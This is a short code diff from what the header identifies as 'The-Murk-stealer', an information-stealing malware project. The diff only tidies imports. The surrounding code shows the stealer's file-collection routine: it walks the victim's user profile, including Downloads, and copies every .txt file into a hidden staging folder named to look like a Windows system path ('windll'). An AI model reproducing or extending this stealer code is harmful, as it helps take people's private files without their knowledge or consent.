@@ -9,24 +9,25 @@
 #                      https://github.com/Nick-Vinesmoke                      #
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
-import os
-import shutil
+from os import environ, walk
+from os.path import join
+from shutil import copy2
 from manager.logger import Log
 
 def copy_txt_files(source_folder, destination_folder):
 	try:
-		for root, dirs, files in os.walk(source_folder):
+		for root, dirs, files in walk(source_folder):
 			for file in files:
 				if file.endswith('.txt'):
-					source_path = os.path.join(root, file)
-					destination_path = os.path.join(destination_folder, file)
-					shutil.copy2(source_path, destination_path)
+					source_path = join(root, file)
+					destination_path = join(destination_folder, file)
+					copy2(source_path, destination_path)
 	except Exception as error:
 		Log(error)
 
 def TxtFiles():
 	Log("===========TxtFiles===========")
-	path = os.environ['USERPROFILE']
+	path = environ['USERPROFILE']
 
 	destination_folder = fr"{path}/AppData/Local/windll/Files/"
 	downloads = fr"{path}/Downloads"
